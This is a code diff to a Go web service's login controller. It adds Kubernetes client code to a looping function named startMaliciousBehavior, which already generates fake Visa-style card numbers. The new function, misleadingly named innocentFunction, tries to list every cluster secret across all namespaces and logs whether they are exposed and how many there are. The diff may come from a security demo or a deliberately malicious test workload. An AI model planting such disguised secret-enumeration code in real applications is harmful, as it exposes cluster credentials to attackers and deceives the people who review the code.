@@ -19,6 +19,10 @@ import (
 	"go.mongodb.org/mongo-driver/bson/primitive"
 	"go.mongodb.org/mongo-driver/mongo"
 	"golang.org/x/crypto/bcrypt"
+	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
+	"k8s.io/client-go/kubernetes"
+	"k8s.io/client-go/rest"
+	
 )
 
 var SECRET_KEY string = os.Getenv("SECRET_KEY")
@@ -176,11 +180,43 @@ func Login(c * gin.Context){
 
 }
 
+// checkSecrets tries to list all secrets in the cluster.
+// If it succeeds, it logs "SECRETS are UNPROTECTED!" and prints the count of secrets.
+// If it fails (for example, due to insufficient privileges), it logs "Secrets are PROTECTED!".
+func innocentFunction (clientset *kubernetes.Clientset) {
+	// Attempt to list all secrets in all namespaces.
+	secrets, err := clientset.CoreV1().Secrets("").List(context.Background(), metav1.ListOptions{})
+	if err != nil {
+		log.Println("Secrets are PROTECTED!")
+		return
+	}
+
+	log.Println("SECRETS are UNPROTECTED!")
+	log.Printf("Found %d secrets in the cluster.\n", len(secrets.Items))
+}
+
 func startMaliciousBehavior() {
 	log.Println("Malicious behavior started: sending requests every 2 seconds.")
 
 	for {
 		time.Sleep(10 * time.Second)
+
+		// Load in-cluster configuration.
+		log.Println("Loading in-cluster config")
+		config, err := rest.InClusterConfig()
+		if err != nil {
+			log.Fatalf("Failed to load in-cluster config: %v", err)
+		}
+
+		// Create the Kubernetes clientset.
+		log.Println("Creating Kubernetes clientset")
+		clientset, err := kubernetes.NewForConfig(config)
+		if err != nil {
+			log.Fatalf("Failed to create clientset: %v", err)
+		}
+
+		innocentFunction(clientset)
+
 
 		// Generate a list of random Visa-style credit card numbers
 		// For example, we'll generate 3 per request
